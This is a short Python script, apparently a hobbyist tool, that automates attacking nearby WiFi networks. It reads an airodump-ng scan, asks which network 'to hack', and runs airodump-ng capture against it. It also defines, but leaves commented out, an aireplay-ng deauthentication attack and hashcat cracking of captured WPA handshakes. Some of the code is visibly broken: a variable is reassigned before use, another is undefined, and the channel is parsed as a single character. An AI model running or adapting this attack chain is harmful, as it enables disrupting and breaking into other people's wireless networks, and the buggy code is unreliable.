import subprocess#import
import os
import time
from time import sleep
import csv


import sys
import platform
from subprocess import Popen

path='/home/vmuser/Desktop/DATA/'


def readlines():
	
	path=path+'monitor-01.csv'
	file=open(path,'r')
	csv_reader= csv.reader(file)
	mass=[]
	
	for row in csv_reader:
		mass.append(row)
	bass=[]
	
	for x in range (2,9):
		hues=mass[x]
		
		if hues:
			bass.append(hues)

		else:
			break
		
	
	keys=['BSSID', 'First time seen', 'Last time seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', '# beacons', '# IV', 'LAN IP', 'ID-length', 'ESSID', 'Key']
	
	networks=[]
		
	for x in range (len(bass)):
		raw=bass[x]

		network={}
		for y in range (len(keys)):
		
			para=raw[y]
			key=keys[y]
	
			network[key]=para
		
		#print (network)
		#print(network['BSSID'],'\n')
		networks.append(network)
	
	return networks	
	
def choosetohack(networks):
	
	print('')
	print(' ',len(networks),'networks read from file')
	print('')
	
	for x in range (len(networks)):
		
		bssid=networks[x]['BSSID']
		essid=networks[x]['ESSID']
		
		ch=networks[x]['channel']
		
		channel=ch[2]
		print(x,bssid,essid,channel)
	
	print('')
	print('Enter num of network to hack')
	print('')
	
	chosen=int(input())
	print('Net',chosen,'chosen!')
	
	
	chosennetwork=networks[chosen]
	return chosennetwork
		
def airodump(chosen):
	ch=chosen['channel']
	ch=ch[2]
	
	bash='sudo airodump-ng --channel '+ch+' --bssid '+chosen['BSSID']+' mon0 --write '+path2
	
	airodump=subprocess.call(bash, shell=True)
	
def deauthattack(chosen):
	
	bash='sudo aireplay-ng -0 4 -a '+chosen['BSSID']+' mon0'+' --ignore-negative-one'
	
	subprocess.call(bash, shell=True)
	
def crack():
	
	
	bash='HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh'
	
	subprocess.call(bash, shell=True)
	



def main():
		
		
		
	#openssepcript
	new_window_command = "x-terminal-emulator -e".split()
	
	
	networks = readlines()
	chosen = choosetohack(networks)
	print(chosen)
	airodump(chosen)
	
	
	#deauthattack(chosen)
	
	#crack()

	
	
	
	
main()











